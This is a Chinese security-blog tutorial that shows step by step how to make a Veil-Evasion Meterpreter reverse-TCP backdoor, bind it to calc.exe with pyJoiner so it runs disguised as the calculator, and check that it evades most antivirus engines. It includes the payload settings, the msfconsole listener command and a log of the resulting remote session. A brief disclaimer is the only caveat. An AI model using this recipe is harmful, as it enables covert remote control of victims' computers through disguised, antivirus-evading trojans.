##
![veil.png](https://image.3001.net/images/20180306/15203413194076.png!small)  

## 0x00 前言

最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习，小白视角，大牛绕过。

 **PS：本文仅用于技术讨论与分享，严禁用于任何非法用途**

## 0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马

Veil-Evasion 制作回连木马

    
    
    root@kali:~# veil
    use 1                        #选择使用 Veil-Evasion 模块
    Veil-Evasion Menu
        41 payloads loaded
    Available Commands:
        back            Go to main Veil menu
        checkvt         Check virustotal against generated hashes
        clean           Remove generated artifacts
        exit            Exit Veil
        info            Information on a specific payload
        list            List available payloads
        use             Use a specific payload
    Veil-Evasion command: use 11        #选择payload
    [cs/meterpreter/rev_tcp>>] set LHOST 192.168.3.149
    [cs/meterpreter/rev_tcp>>] set LPORT 4444
    [cs/meterpreter/rev_tcp>>] generate
    

![q.jpg](https://image.3001.net/images/20180306/15203393697988.jpg!small)

使用以下命令开启监听：

`root@kali:~# msfconsole -r /var/lib/veil/output/handlers/test.rc`

## 0x02 配置 pyJoiner---GUI-Version 运行环境

GitHub 上有两个版本 [项目地址](https://github.com/danielhnmoreno) ，其中 kali 版必须使用 Kali
Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner---GUI-Version。

本次实验 pyJoiner 运行环境如下：

> Windows 10
>
> Python 3.6.3
>
> pyinstaller 3.3.1

## 0x03 将两个exe文件进行捆绑

这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下：

`py -3 pyJoiner.py` #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD

打开 GUI 如下图：

![2222.jpg](https://image.3001.net/images/20180306/1520339428360.jpg!small)  

实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。

捆绑后生成的 exe 路径如下：

![3333333.jpg](https://image.3001.net/images/20180306/15203394501264.jpg!small)  

## 0x04 免杀回连测试

使用在线查杀引擎 virustotal 的结果能过大多数杀软，如下：

![44444.jpg](https://image.3001.net/images/20180306/15203394682822.jpg!small)  

PS：在测试中本机装有趋势科技杀软，未对文件查杀只是检测到了行为。

回连测试：

目标机 Windows 10 在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器  

![555.jpg](https://image.3001.net/images/20180306/15203395159393.jpg!small)

kali 回连 Meteoreter session

    
    
    msf exploit(multi/handler) > [*] Sending stage (179779 bytes) to 192.168.3.138
    [*] Meterpreter session 1 opened (192.168.3.149:4444 -> 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500
    

## 参考资料

> <https://www.youtube.com/watch?v=vHz8QU2Dj9M>
>
> <https://github.com/danielhnmoreno/pyJoiner---GUI-Version>

 ***本文作者：АιщаУδ ○Иι讠ηē，转载请注明来自FreeBuf.COM**

